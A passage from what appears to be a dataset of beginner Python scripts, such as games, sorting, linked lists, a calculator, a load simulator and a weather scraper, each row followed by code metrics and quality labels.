    number = name_to_number(name)
    comp_number = random.randrange(0, 2)
    comp_choice = number_to_name(comp_number)
    print(comp_choice)

    comp = -int(comp_number)
    play = int(number)
    diff = (comp + play) % 5

    if diff == 1 or diff == 3:
        print(""you won!!!"")
    elif diff == 0:
        print(""draw"")
    elif diff == 2 or diff == 4:
        print(""you lose!!!"")
",906,34,34,11,4,4,0,3.0,14,16,5,31.0,23,,47,115.65156546374811,225.94568133670737,3.369565217391304,medio,No,False,True,Low-Medium,id288
happy_num.py,"#Way2 1:

#isHappyNumber() will determine whether a number is happy or not    
def isHappyNumber(num):    
    rem = sum = 0;    
        
    #Calculates the sum of squares of digits    
    while(num > 0):    
        rem = num%10;    
        sum = sum + (rem*rem);    
        num = num//10;    
    return sum;    
        
num = 82;    
result = num;    
     
while(result != 1 and result != 4):    
    result = isHappyNumber(result);    
     
#Happy number always ends with 1    
if(result == 1):    
    print(str(num) + "" is a happy number after apply way 1"");    
#Unhappy number ends in a cycle of repeating numbers which contain 4    
elif(result == 4):    
    print(str(num) + "" is not a happy number after apply way 1"");  





#way 2:

#Another way to do this and code is also less
n=num
setData=set()		#set datastructure for checking a number is repeated or not.
while 1:
	if n==1:
		print(""{} is a happy number after apply way 2"".format(num))
		break
	if n in setData:
		print(""{} is Not a happy number after apply way 2"".format(num))
		break
	else:
		setData.add(n)	#adding into set if not inside set
		n=int(''.join(str(sum([int(i)**2 for i in str(n)]))))       #Pythonic way
",1199,27,27,11,10,7,0,1.0,2,15,10,30.0,19,,45,113.92990370430176,218.6091447807408,7.894736842105263,medio,No,False,False,Medium,id289
Program to print table of given number.py,"n = int(input(""Enter the number to print the tables for:""))
for i in range(1, 11):
    print(n, ""x"", i, ""="", n * i)

# Example
# input: 2
# output:
""""""
2 x 1 = 2
2 x 2 = 4
2 x 3 = 6
2 x 4 = 8
2 x 5 = 10
2 x 6 = 12
2 x 7 = 14
2 x 8 = 16
2 x 9 = 18
2 x 10 = 20
""""""
",263,4,3,1,3,3,12,,0,1,1,2.0,2,,3,2.0,4.754887502163469,0.5,bajo,No,True,False,Low,id290
Binary_Insertion_Sort.py,"def Binary_Search(Test_arr, low, high, k):
    if high >= low:
        Mid = (low + high) // 2
        if Test_arr[Mid] < k:
            return Binary_Search(Test_arr, Mid + 1, high, k)
        elif Test_arr[Mid] > k:
            return Binary_Search(Test_arr, low, Mid - 1, k)
        else:
            return Mid
    else:
        return low


def Insertion_Sort(Test_arr):
    for i in range(1, len(Test_arr)):
        val = Test_arr[i]
        j = Binary_Search(Test_arr[:i], 0, len(Test_arr[:i]) - 1, val)
        Test_arr.pop(i)
        Test_arr.insert(j, val)
    return Test_arr


if __name__ == ""__main__"":
    Test_list = input(""Enter the list of Numbers: "").split()
    Test_list = [int(i) for i in Test_list]
    print(f""Binary Insertion Sort: {Insertion_Sort(Test_list)}"")
",786,23,22,4,0,0,0,2.0,6,9,7,18.0,13,,27,67.75720079023742,116.6920585619588,4.846153846153846,bajo,No,True,False,Low-Medium,id291
StringToBinary.py,"text = input(""Enter Text : "")

for chr in text:
    bin = """"
    asciiVal = int(ord(chr))
    while asciiVal > 0:
        if asciiVal % 2 == 0:
            bin = bin + ""0""
        else:
            bin = bin + ""1""
        asciiVal = int(asciiVal / 2)
    print(bin + "" : "" + bin[::-1])
",286,12,11,1,0,0,0,,0,9,6,17.0,11,,26,53.563522809337215,106.27403387250884,4.636363636363637,medio,No,True,False,Low,id292
Insert_operation_on_Linked_List.py,"class Node:
    def __init__(self, data):
        self.data = data
        self.next = None


class Linked_List:
    def __init__(self):
        self.head = None

    def Insert_At_Beginning(self, new_data):
        new_node = Node(new_data)
        new_node.next = self.head
        self.head = new_node

    def Insert_After(self, node, new_data):
        if node is None:
            return ""Alert!, Node must be in Linked List""
        new_node = Node(new_data)
        new_node.next = node.next
        node.next = new_node

    def Insert_At_End(self, new_data):
        new_node = Node(new_data)
        if self.head is None:
            self.head = new_node
            return
        current = self.head
        while current.next:
            current = current.next
        current.next = new_node

    def Display(self):
        temp = self.head
        while temp:
            print(temp.data, ""->"", end="" "")
            temp = temp.next
        print(""None"")


if __name__ == ""__main__"":
    L_list = Linked_List()
    L_list.Insert_At_Beginning(1)
    L_list.Display()
    L_list.Insert_At_Beginning(2)
    L_list.Display()
    L_list.Insert_At_Beginning(3)
    L_list.Display()
    L_list.Insert_At_End(4)
    L_list.Display()
    L_list.Insert_At_End(5)
    L_list.Display()
    L_list.Insert_At_End(6)
    L_list.Display()
    L_list.Insert_After(L_list.head.next, 10)
    L_list.Display()
",1463,48,48,8,0,0,0,6.0,15,3,2,6.0,6,,9,17.509775004326936,27.0,1.0,bajo,Yes,False,False,Low,id293
new_script.py,"from __future__ import print_function

import datetime  # Load the library module
import os  # Load the library module
import sys  # Load the library module

# Script Name	: new_script.py
# Author			: Craig Richards
# Created			: 20th November 2012
# Last Modified	:
# Version			: 1.0
# Modifications	:
# Description		: This will create a new basic template for a new script

text = """"""You need to pass an argument for the new script you want to create, followed by the script name.  You can use
	-python	: Python Script
	-bash	: Bash Script
	-ksh	: Korn Shell Script
	-sql	: SQL Script""""""

if len(sys.argv) < 3:
    print(text)
    sys.exit()

if ""-h"" in sys.argv or ""--h"" in sys.argv or ""-help"" in sys.argv or ""--help"" in sys.argv:
    print(text)
    sys.exit()
else:
    if ""-python"" in sys.argv[1]:
        config_file = ""python.cfg""
        extension = "".py""
    elif ""-bash"" in sys.argv[1]:
        config_file = ""bash.cfg""
        extension = "".bash""
    elif ""-ksh"" in sys.argv[1]:
        config_file = ""ksh.cfg""
        extension = "".ksh""
    elif ""-sql"" in sys.argv[1]:
        config_file = ""sql.cfg""
        extension = "".sql""
    else:
        print(""Unknown option - "" + text)
        sys.exit()

confdir = os.getenv(""my_config"")
scripts = os.getenv(""scripts"")
dev_dir = ""Development""
newfile = sys.argv[2]
output_file = newfile + extension
outputdir = os.path.join(scripts, dev_dir)
script = os.path.join(outputdir, output_file)
input_file = os.path.join(confdir, config_file)
old_text = "" Script Name	: ""
new_text = "" Script Name	: "" + output_file
if not (os.path.exists(outputdir)):
    os.mkdir(outputdir)
newscript = open(script, ""w"")
input = open(input_file, ""r"")
today = datetime.date.today()
old_date = "" Created	:""
new_date = "" Created	: "" + today.strftime(""%d %B %Y"")

for line in input:
    line = line.replace(old_text, new_text)
    line = line.replace(old_date, new_date)
    newscript.write(line)
",1994,48,52,7,10,7,0,0.0,0,15,5,31.0,28,,46,146.2155782920497,232.0421294904889,2.767857142857143,medio,No,False,False,Low-Medium,id294
blackjack_rr.py,"import random


class Colour:
    BLACK = ""\033[30m""
    RED = ""\033[91m""
    GREEN = ""\033[32m""
    END = ""\033[0m""


suits = (
    Colour.RED + ""Hearts"" + Colour.END,
    Colour.RED + ""Diamonds"" + Colour.END,
    Colour.BLACK + ""Spades"" + Colour.END,
    Colour.BLACK + ""Clubs"" + Colour.END,
)
ranks = (
    ""Two"",
    ""Three"",
    ""Four"",
    ""Five"",
    ""Six"",
    ""Seven"",
    ""Eight"",
    ""Nine"",
    ""Ten"",
    ""Jack"",
    ""Queen"",
    ""King"",
    ""Ace"",
)
values = {
    ""Two"": 2,
    ""Three"": 3,
    ""Four"": 4,
    ""Five"": 5,
    ""Six"": 6,
    ""Seven"": 7,
    ""Eight"": 8,
    ""Nine"": 9,
    ""Ten"": 10,
    ""Jack"": 10,
    ""Queen"": 10,
    ""King"": 10,
    ""Ace"": 11,
}

playing = True


class Card:
    def __init__(self, suit, rank):
        self.suit = suit
        self.rank = rank

    def __str__(self):
        return self.rank + "" of "" + self.suit


class Deck:
    def __init__(self):
        self.deck = []
        for suit in suits:
            for rank in ranks:
                self.deck.append(Card(suit, rank))

    def __str__(self):
        deck_comp = """"
        for card in self.deck:
            deck_comp += ""\n "" + card.__str__()

    def shuffle(self):
        random.shuffle(self.deck)

    def deal(self):
        single_card = self.deck.pop()
        return single_card


class Hand:
    def __init__(self):
        self.cards = []
        self.value = 0
        self.aces = 0  # to keep track of aces

    def add_card(self, card):
        self.cards.append(card)
        self.value += values[card.rank]
        if card.rank == ""Ace"":
            self.aces += 1

    def adjust_for_ace(self):
        while self.value > 21 and self.aces:
            self.value -= 10
            self.aces -= 1


class Chips:
    def __init__(self):
        self.total = 100
        self.bet = 0

    def win_bet(self):
        self.total += self.bet

    def lose_bet(self):
        self.total -= self.bet


def take_bet(chips):
    while True:
        try:
            chips.bet = int(input(""How many chips would you like to bet? ""))
        except ValueError:
            print(""Your bet must be an integer! Try again."")
        else:
            if chips.bet > chips.total or chips.bet <= 0:
                print(
                    ""Your bet cannot exceed your balance and you have to enter a positive bet! Your current balance is: "",
                    chips.total,
                )
            else:
                break


def hit(deck, hand):
    hand.add_card(deck.deal())
    hand.adjust_for_ace()


def hit_or_stand(deck, hand):
    global playing

    while True:
        x = input(""Would you like to Hit or Stand? Enter '1' or '0' "")

        if x.lower() == ""1"":
            hit(deck, hand)

        elif x.lower() == ""0"":
            print(""You chose to stand. Dealer will hit."")
            playing = False

        else:
            print(""Wrong input, please try again."")
            continue
        break


def show_some(player, dealer):
    print(""\nDealer's Hand:"")
    print("" { hidden card }"")
    print("""", dealer.cards[1])
    print(""\nYour Hand:"", *player.cards, sep=""\n "")


def show_all(player, dealer):
    print(""\nDealer's Hand:"", *dealer.cards, sep=""\n "")
    print(""Dealer's Hand ="", dealer.value)
    print(""\nYour Hand:"", *player.cards, sep=""\n "")
    print(""Your Hand ="", player.value)


def player_busts(player, dealer, chips):
    print(""You are BUSTED !"")
    chips.lose_bet()


def player_wins(player, dealer, chips):
    print(""You are the winner!"")
    chips.win_bet()


def dealer_busts(player, dealer, chips):
    print(""Dealer has BUSTED !"")
    chips.win_bet()


def dealer_wins(player, dealer, chips):
    print(""Dealer is the winner!"")
    chips.lose_bet()


def push(player, dealer):
    print(""The match is tie !"")


# GAMEPLAY
player_chips = Chips()

while True:

    print(""\t              **********************************************************"")
    print(
        ""\t                       Welcome to the game Casino - BLACK JACK !                                                     ""
    )
    print(""\t              **********************************************************"")
    print(Colour.BLACK + ""\t                                   ***************"")
    print(""\t                                   * A           *"")
    print(""\t                                   *             *"")
    print(""\t                                   *      *      *"")
    print(""\t                                   *     ***     *"")
    print(""\t                                   *    *****    *"")
    print(""\t                                   *     ***     *"")
    print(""\t                                   *      *      *"")
    print(""\t                                   *             *"")
    print(""\t                                   *             *"")
    print(""\t                                   ***************"" + Colour.END)

    print(
        ""\nRULES: Get as close to 21 as you can but if you get more than 21 you will lose!\n  Aces count as 1 or 11.""
    )

    deck = Deck()
    deck.shuffle()

    player_hand = Hand()
    player_hand.add_card(deck.deal())
    player_hand.add_card(deck.deal())

    dealer_hand = Hand()
    dealer_hand.add_card(deck.deal())
    dealer_hand.add_card(deck.deal())

    take_bet(player_chips)

    show_some(player_hand, dealer_hand)

    while playing:

        hit_or_stand(deck, player_hand)
        show_some(player_hand, dealer_hand)

        if player_hand.value > 21:
            player_busts(player_hand, dealer_hand, player_chips)
            break

    if player_hand.value <= 21:

        while dealer_hand.value < 17:
            hit(deck, dealer_hand)

        show_all(player_hand, dealer_hand)

        if dealer_hand.value > 21:
            dealer_busts(player_hand, dealer_hand, player_chips)

        elif dealer_hand.value > player_hand.value:
            dealer_wins(player_hand, dealer_hand, player_chips)

        elif dealer_hand.value < player_hand.value:
            player_wins(player_hand, dealer_hand, player_chips)

        else:
            push(player_hand, dealer_hand)

    print(""\nYour current balance stands at"", player_chips.total)

    if player_chips.total > 0:
        new_game = input(""Would you like to play another hand? Enter '1' or '0' "")
        if new_game.lower() == ""1"":
            playing = True
            continue
        else:
            print(
                ""Thanks for playing!\n""
                + Colour.GREEN
                + ""\t$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\n \t      Congratulations! You won ""
                + str(player_chips.total)
                + "" coins!\n\t$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\n ""
                + Colour.END
            )
            break
    else:
        print(
            ""Oops! You have bet all your chips and we are sorry you can't play more.\nThanks for playing! Do come again to Casino BLACK JACK!""
        )
        break
",6985,162,210,67,2,1,0,22.0,47,41,8,82.0,61,,123,385.7749775913361,751.3485081837149,5.377049180327869,bajo,Yes,True,True,Medium-High,id295
live_sketch.py,"import cv2


def sketch(image):
    img_gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
    img_gray_blur = cv2.GaussianBlur(img_gray, (5, 5), 0)
    canny_edges = cv2.Canny(img_gray_blur, 10, 70)
    ret, mask = cv2.threshold(canny_edges, 70, 255, cv2.THRESH_BINARY_INV)
    return mask


cap = cv2.VideoCapture(0)

while True:
    ret, frame = cap.read()
    cv2.imshow(""Our Live Sketcher"", sketch(frame))
    if cv2.waitKey(1) == 13:
        break

cap.release()
cv2.destroyAllWindows()
",489,15,15,6,0,0,0,1.0,1,1,1,2.0,2,,3,2.0,4.754887502163469,0.5,medio,No,False,False,Low,id296
wallpaper_extract.py,"import os
import shutil
import time

from PIL import Image


class Wallpaper:
    # Set Environment Variables
    username = os.environ[""USERNAME""]
    # An Amazing Code You Will Love To Have
    # All file urls
    file_urls = {
        ""wall_src"": ""C:\\Users\\""
        + username
        + ""\\AppData\\Local\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\""
        + ""LocalState\\Assets\\"",
        ""wall_dst"": os.path.dirname(os.path.abspath(__file__)) + ""\\Wallpapers\\"",
        ""wall_mobile"": os.path.dirname(os.path.abspath(__file__))
        + ""\\Wallpapers\\mobile\\"",
        ""wall_desktop"": os.path.dirname(os.path.abspath(__file__))
        + ""\\Wallpapers\\desktop\\"",
    }
    msg = """"""
                DDDDD      OOOOO    NN      N  EEEEEEE
                D    D    O     O   N N     N  E
                D     D   O     O   N  N    N  E
                D     D   O     O   N   N   N  EEEE
                D     D   O     O   N    N  N  E
                D    D    O     O   N     N N  E
                DDDDD      OOOOO    N      NN  EEEEEEE
            """"""

    # A method to showcase time effect
    @staticmethod
    def time_gap(string):
        print(string, end="""")
        time.sleep(1)
        print(""."", end="""")
        time.sleep(1)
        print(""."")

    # A method to import the wallpapers from src folder(dir_src)
    @staticmethod
    def copy_wallpapers():
        w = Wallpaper
        w.time_gap(""Copying Wallpapers"")
        # Copy All Wallpapers From Src Folder To Dest Folder
        for filename in os.listdir(w.file_urls[""wall_src""]):
            shutil.copy(w.file_urls[""wall_src""] + filename, w.file_urls[""wall_dst""])

    # A method to Change all the Extensions
    @staticmethod
    def change_ext():
        w = Wallpaper
        w.time_gap(""Changing Extensions"")
        # Look into all the files in the executing folder and change extension
        for filename in os.listdir(w.file_urls[""wall_dst""]):
            base_file, ext = os.path.splitext(filename)
            if ext == """":
                if not os.path.isdir(w.file_urls[""wall_dst""] + filename):
                    os.rename(
                        w.file_urls[""wall_dst""] + filename,
                        w.file_urls[""wall_dst""] + filename + "".jpg"",
                    )

    # Remove all files Not having Wallpaper Resolution
    @staticmethod
    def extract_wall():
        w = Wallpaper
        w.time_gap(""Extracting Wallpapers"")
        for filename in os.listdir(w.file_urls[""wall_dst""]):
            base_file, ext = os.path.splitext(filename)
            if ext == "".jpg"":
                try:
                    im = Image.open(w.file_urls[""wall_dst""] + filename)
                except IOError:
                    print(""This isn't a picture."", filename)
                if list(im.size)[0] != 1920 and list(im.size)[0] != 1080:
                    im.close()
                    os.remove(w.file_urls[""wall_dst""] + filename)
                else:
                    im.close()

    # Arrange the wallpapers into the corresponding folders
    @staticmethod
    def arr_desk_wallpapers():
        w = Wallpaper
        w.time_gap(""Arranging Desktop wallpapers"")
        for filename in os.listdir(w.file_urls[""wall_dst""]):
            base_file, ext = os.path.splitext(filename)
            if ext == "".jpg"":
                try:
                    im = Image.open(w.file_urls[""wall_dst""] + filename)

                    if list(im.size)[0] == 1920:
                        im.close()
                        os.rename(
                            w.file_urls[""wall_dst""] + filename,
                            w.file_urls[""wall_desktop""] + filename,
                        )
                    elif list(im.size)[0] == 1080:
                        im.close()
                        os.rename(
                            w.file_urls[""wall_dst""] + filename,
                            w.file_urls[""wall_mobile""] + filename,
                        )
                    else:
                        im.close()
                except FileExistsError:
                    print(""File Already Exists!"")
                    os.remove(w.file_urls[""wall_dst""] + filename)

    @staticmethod
    def exec_all():
        w = Wallpaper
        w.copy_wallpapers()
        w.change_ext()
        w.extract_wall()
        w.arr_desk_wallpapers()
        print(w.msg)
        time.sleep(2)


wall = Wallpaper()
wall.exec_all()
",4475,78,104,12,10,10,0,,24,28,5,55.0,47,,83,272.6753165032857,473.1364966057107,2.925531914893617,bajo,Yes,False,False,Medium,id297
simulate_memory_cpu.py,"#! /user/bin/env python
# -*- encoding: utf-8 -*-
""""""
Simulate cpuã memory usage
""""""

import sys
import re
import time
from multiprocessing import Process, cpu_count


def print_help():
    print('Usage: ')
    print('  python cpu_memory_simulator.py m 1GB')
    print('  python cpu_memory_simulator.py c 1')
    print('  python cpu_memory_simulator.py mc 1GB 2')

# memory usage


def mem():
    pattern = re.compile('^(\d*)([M|G]B)$')
    size = sys.argv[2].upper()
    match = pattern.match(size)
    if match:
        num = int(match.group(1))
        unit = match.group(2)
        if unit == 'MB':
            s = ' ' * (num * 1024 * 1024)
        else:
            s = ' ' * (num * 1024 * 1024 * 1024)
        time.sleep(24 * 3600)
    else:
        print(""bad args....."")
        print_help()

# cpu usage


def deadloop():
    while True:
        pass

# Specify how many cores to occupy according to the parameters


def cpu():
    arg = sys.argv[2] if len(sys.argv) == 3 else sys.argv[3]
    cpu_num = cpu_count()
    cores = int(arg)
    if not isinstance(cores, int):
        print(""bad args not int"")
        return

    if cores > cpu_num:
        print(""Invalid CPU Num(cpu_count=""+str(cpu_num)+"")"")
        return

    if cores is None or cores < 1:
        cores = 1

    for i in range(cores):
        Process(target=deadloop).start()


def mem_cpu():
    Process(target=mem).start()
    Process(target=cpu).start()


if __name__ == ""__main__"":
    if len(sys.argv) >= 3:
        switcher = {
            'm': mem,
            'c': cpu,
            'mc': mem_cpu
        }
        switcher.get(sys.argv[1], mem)()
    else:
        print_help()
",1665,52,54,19,5,5,3,5.0,14,19,9,,29,,56,169.41077387168042,293.8839407528408,5.741379310344827,medio,No,False,False,Medium,id298
avg_xdspam_confidence.py,"fh = open(""mbox-short.txt"")
# The 'mbox-short.txt' file can be downloaded from the link: https://www.py4e.com/code3/mbox-short.txt
sum = 0
count = 0
for fx in fh:
    fx = fx.rstrip()
    if not fx.startswith(""X-DSPAM-Confidence:""):
        continue
    fy = fx[19:]
    count = count + 1
    sum = sum + float(fy)
print(""Average spam confidence: "", sum / count)
",363,12,11,0,1,1,0,0.0,0,4,3,7.0,5,8.0,11,16.36452797660028,33.0,2.1,alto,No,False,False,Low,id299
WeatherGUI.py,"import tkinter as tk
import requests
from bs4 import BeautifulSoup

url = ""https://weather.com/en-IN/weather/today/l/32355ced66b7ce3ab7ccafb0a4f45f12e7c915bcf8454f712efa57474ba8d6c8""

root = tk.Tk()
root.title(""Weather"")
root.config(bg=""white"")


def getWeather():
    page = requests.get(url)
    soup = BeautifulSoup(page.content, ""html.parser"")
    location = soup.find(""h1"", class_=""_1Ayv3"").text
    temperature = soup.find(""span"", class_=""_3KcTQ"").text
    airquality = soup.find(""text"", class_=""k2Z7I"").text
    airqualitytitle = soup.find(""span"", class_=""_1VMr2"").text
    sunrise = soup.find(""div"", class_=""_2ATeV"").text
    sunset = soup.find(""div"", class_=""_2_gJb _2ATeV"").text
    # humidity = soup.find('div',class_='_23DP5').text
    wind = soup.find(""span"", class_=""_1Va1P undefined"").text
    pressure = soup.find(""span"", class_=""_3olKd undefined"").text
    locationlabel.config(text=(location))
    templabel.config(text=temperature + ""C"")
    WeatherText = (
        ""Sunrise : ""
        + sunrise
        + ""\n""
        + ""SunSet : ""
        + sunset
        + ""\n""
        + ""Pressure : ""
        + pressure
        + ""\n""
        + ""Wind : ""
        + wind
        + ""\n""
    )
    weatherPrediction.config(text=WeatherText)
    airqualityText = airquality + "" "" * 5 + airqualitytitle + ""\n""
    airqualitylabel.config(text=airqualityText)

    weatherPrediction.after(120000, getWeather)
    root.update()


locationlabel = tk.Label(root, font=(""Calibri bold"", 20), bg=""white"")
locationlabel.grid(row=0, column=1, sticky=""N"", padx=20, pady=40)

templabel = tk.Label(root, font=(""Caliber bold"", 40), bg=""white"")
templabel.grid(row=0, column=0, sticky=""W"", padx=17)

weatherPrediction = tk.Label(root, font=(""Caliber"", 15), bg=""white"")
weatherPrediction.grid(row=2, column=1, sticky=""W"", padx=40)

tk.Label(root, text=""Air Quality"", font=(""Calibri bold"", 20), bg=""white"").grid(
    row=1, column=2, sticky=""W"", padx=20
)
airqualitylabel = tk.Label(root, font=(""Caliber bold"", 20), bg=""white"")
airqualitylabel.grid(row=2, column=2, sticky=""W"")

getWeather()
root.mainloop()
",2157,37,52,11,1,1,0,1.0,1,16,2,32.0,28,,48,136.6059378176129,235.53074858920888,1.1428571428571428,medio,No,False,False,Low,id300
calculator.py,"""""""
Written by  : Shreyas Daniel - github.com/shreydan
Description : Uses Pythons eval() function
              as a way to implement calculator.
             
Functions available are:
--------------------------------------------
                         + : addition
                         - : subtraction
                         * : multiplication
                         / : division
                         % : percentage
                         e : 2.718281...
                        pi : 3.141592... 
                      sine : sin(rad)
                    cosine : cos(rad)
                   exponent: x^y
                   tangent : tan(rad)
                 remainder : XmodY
               square root : sqrt(n)
  round to nearest integer : round(n)
convert degrees to radians : rad(deg)
absolute value             : aval(n)
""""""

import sys

## Imported math library to run sin(), cos(), tan() and other such functions in the calculator

from fileinfo import raw_input


def calc(term):
    """"""
    input: term of type str
    output: returns the result of the computed term.
    purpose: This function is the actual calculator and the heart of the application
    """"""

    # This part is for reading and converting arithmetic terms.
    term = term.replace("" "", """")
    term = term.replace(""^"", ""**"")
    term = term.replace(""="", """")
    term = term.replace(""?"", """")
    term = term.replace(""%"", ""/100.00"")
    term = term.replace(""rad"", ""radians"")
    term = term.replace(""mod"", ""%"")
    term = term.replace(""aval"", ""abs"")

    functions = [
        ""sin"",
        ""cos"",
        ""tan"",
        ""pow"",
        ""cosh"",
        ""sinh"",
        ""tanh"",
        ""sqrt"",
        ""pi"",
        ""radians"",
        ""e"",
    ]

    # This part is for reading and converting function expressions.
    term = term.lower()

    for func in functions:
        if func in term:
            withmath = ""math."" + func
            term = term.replace(func, withmath)

    try:

        # here goes the actual evaluating.
        term = eval(term)

    # here goes to the error cases.
    except ZeroDivisionError:

        print(""Can't divide by 0.  Please try again."")

    except NameError:

        print(""Invalid input.  Please try again"")

    except AttributeError:

        print(""Please check usage method and try again."")
    except TypeError:
        print(""please enter inputs of correct datatype "")

    return term


def result(term):
    """"""
    input:  term of type str
    output: none
    purpose: passes the argument to the function calc(...) and
            prints the result onto console.
    """"""
    print(""\n"" + str(calc(term)))


def main():
    """"""
    main-program
    purpose: handles user input and prints
             information to the console.
    """"""

    print(
        ""\nScientific Calculator\n\nFor Example: sin(rad(90)) + 50% * (sqrt(16)) + round(1.42^2)""
        + ""- 12mod3\n\nEnter quit to exit""
    )

    if sys.version_info.major >= 3:
        while True:
            k = input(""\nWhat is "")
            if k == ""quit"":
                break
            result(k)

    else:
        while True:
            k = raw_input(""\nWhat is "")
            if k == ""quit"":
                break
            result(k)


if __name__ == ""__main__"":
    main()
",3295,50,61,28,5,5,39,3.0,14,8,4,16.0,13,,24,56.1057163358342,98.09910819000817,2.4615384615384617,medio,No,True,False,Low,id301
tic_tak_toe.py,"# Tic-Tac-Toe Program using
# random number in Python

# importing all necessary libraries
import numpy as np
import random
from time import sleep

# Creates an empty board
def create_board():
    return np.array([[0, 0, 0], [0, 0, 0], [0, 0, 0]])


# Check for empty places on board
def possibilities(board):
    l = []

    for i in range(len(board)):
        for j in range(len(board)):

            if board[i][j] == 0:
                l.append((i, j))
    return l


# Select a random place for the player
def random_place(board, player):
    selection = possibilities(board)
    current_loc = random.choice(selection)
    board[current_loc] = player
    return board


# Checks whether the player has three
# of their marks in a horizontal row
def row_win(board, player):
    for x in range(len(board)):
        win = True

        for y in range(len(board)):
            if board[x, y] != player:
                win = False
                continue

        if win == True:
            return win
    return win


# Checks whether the player has three
# of their marks in a vertical row
def col_win(board, player):
    for x in range(len(board)):
        win = True

        for y in range(len(board)):
            if board[y][x] != player:
                win = False
                continue

        if win == True:
            return win
    return win


# Checks whether the player has three
# of their marks in a diagonal row
def diag_win(board, player):
    win = True
    y = 0
    for x in range(len(board)):
        if board[x, x] != player:
            win = False
    if win:
        return win
    win = True
    if win:
        for x in range(len(board)):
            y = len(board) - 1 - x
            if board[x, y] != player:
                win = False
    return win


# Evaluates whether there is
# a winner or a tie
def evaluate(board):
    winner = 0

    for player in [1, 2]:
        if row_win(board, player) or col_win(board, player) or diag_win(board, player):

            winner = player

    if np.all(board != 0) and winner == 0:
        winner = -1
    return winner


# Main function to start the game
def play_game():
    board, winner, counter = create_board(), 0, 1
    print(board)
    sleep(2)

    while winner == 0:
        for player in [1, 2]:
            board = random_place(board, player)
            print(""Board after "" + str(counter) + "" move"")
            print(board)
            sleep(2)
            counter += 1
            winner = evaluate(board)
            if winner != 0:
                break
    return winner


# Driver Code
print(""Winner is: "" + str(play_game()))
",2633,76,76,28,16,16,0,8.0,34,20,7,40.0,36,,60,205.76878450632643,325.57588528212585,3.888888888888889,medio,No,False,True,Medium,id302
"question 1 (elegible for remedial, top marks).py","""""""Amit is a monitor of class XII-A and he stored the record of all
the students of his class in a file named âclass.datâ.
Structure of record is [roll number, name, percentage]. His computer
teacher has assigned the following duty to Amit

Write a function remcount( ) to count the number of students who need
 remedial class (student who scored less than 40 percent)

 
 """"""
# also find no. of children who got top marks

import pickle

list = [
    [1, ""Ramya"", 30],
    [2, ""vaishnavi"", 60],
    [3, ""anuya"", 40],
    [4, ""kamala"", 30],
    [5, ""anuraag"", 10],
    [6, ""Reshi"", 77],
    [7, ""Biancaa.R"", 100],
    [8, ""sandhya"", 65],
]

with open(""class.dat"", ""ab"") as F:
    pickle.dump(list, F)
    F.close()


def remcount():
    with open(""class.dat"", ""rb"") as F:
        val = pickle.load(F)
        count = 0

        for i in val:
            if i[2] <= 40:
                print(f""{i} eligible for remedial"")
                count += 1
        print(f""the total number of students are {count}"")


remcount()


def firstmark():
    with open(""class.dat"", ""rb"") as F:
        val = pickle.load(F)
        count = 0
        main = [i[2] for i in val]

        top = max(main)
        print(top, ""is the first mark"")

        F.seek(0)
        for i in val:
            if top == i[2]:
                print(f""{i}\ncongrats"")
                count += 1

        print(""the total number of students who secured top marks are"", count)


firstmark()

with open(""class.dat"", ""rb"") as F:
    val = pickle.load(F)
    print(val)
",1603,33,41,19,1,1,7,2.0,7,4,3,8.0,8,,12,28.75488750216347,41.51317942364757,1.5,medio,No,False,False,Low,id303
Number reverse.py,"n=int(input(""Enter number: ""))
rev=0
while(n>0):
    dig=n%10
    rev=rev*10+dig
    n=n//10
print(""Reverse of the number:"",rev)
",129,7,7,0,0,0,0,0.0,0,5,5,10.0,6,,15,27.11941547876375,51.89147427955947,4.166666666666667,medio,No,True,False,Low,id304
Program to reverse Linked List( Recursive solution).py,"from sys import stdin, setrecursionlimit

setrecursionlimit(10 ** 6)

# Following is the Node class already written for the Linked List
class Node:
    def __init__(self, data):
        self.data = data
        self.next = None


def reverseLinkedListRec(head):
    if head is None:
        return None
    if head.next is None:
        return head
    smallhead = reverseLinkedListRec(head.next)
    head.next.next = head
    head.next = None
    return smallhead


# Taking Input Using Fast I/O
def takeInput():
    head = None
    tail = None

    datas = list(map(int, stdin.readline().rstrip().split("" "")))

    i = 0
    while (i < len(datas)) and (datas[i] != -1):
        data = datas[i]
        newNode = Node(data)

        if head is None:
            head = newNode
            tail = newNode

        else:
            tail.next = newNode
            tail = newNode

        i += 1

    return head


def printLinkedList(head):
    while head is not None:
        print(head.data, end="" "")
        head = head.next
        print()


# main
t = int(stdin.readline().rstrip())

while t > 0:

    head = takeInput()

    newHead = reverseLinkedListRec(head)
    printLinkedList(newHead)

    t -= 1
",1209,42,42,20,3,3,0,4.0,12,12,10,23.0,19,,35,113.92990370430176,170.02933482946506,6.052631578947368,medio,Yes,False,False,Medium,id305
search record in binary file.py,"# binary file to search a given record

import pickle


def binary_search():
    with open(""studrec.dat"", ""rb"") as F:
        # your file path will be different
        search = 0
        rno = int(input(""Enter the roll number of the student""))

        for i in pickle.load(F):
            if i[0] == rno:
                print(f""Record found successfully\n{i}"")
                search = 1

        if search == 0:
            print(""Sorry! record not found"")


binary_search()
",500,12,12,7,2,2,0,1.0,4,2,1,4.0,4,,6,8.0,13.931568569324174,0.5,alto,No,True,False,Low,id306
python_sms.py,"from __future__ import print_function

import os
import sqlite3
import urllib  # URL functions
from time import strftime

import urllib2  # URL functions

# Script Name	: python_sms.py
# Author	: Craig Richards
# Created	: 16th February 2017
# Last Modified	:
# Version	: 1.0
# Modifications	:
# Description	: This will text all the students Karate Club

dropbox = os.getenv(""dropbox"")
scripts = os.getenv(""scripts"")
dbfile = ""database/maindatabase.db""
master_db = os.path.join(dropbox, dbfile)

f = open(scripts + ""/output/student.txt"", ""a"")

tdate = strftime(""%d-%m"")

conn = sqlite3.connect(master_db)
cursor = conn.cursor()
loc_stmt = ""SELECT name, number from table""
cursor.execute(loc_stmt)
while True:
    row = cursor.fetchone()
    if row == None:
        break
    sname = row[0]
    snumber = row[1]

    message = (
        f""{sname} There will be NO training tonight on the {tdate}. Sorry for the late notice, I have sent a mail as well, just trying to reach everyone, please do not reply to this message as this is automated""
    )

    username = ""YOUR_USERNAME""
    sender = ""WHO_IS_SENDING_THE_MAIL""

    hash = ""YOUR HASH YOU GET FROM YOUR ACCOUNT""

    numbers = snumber

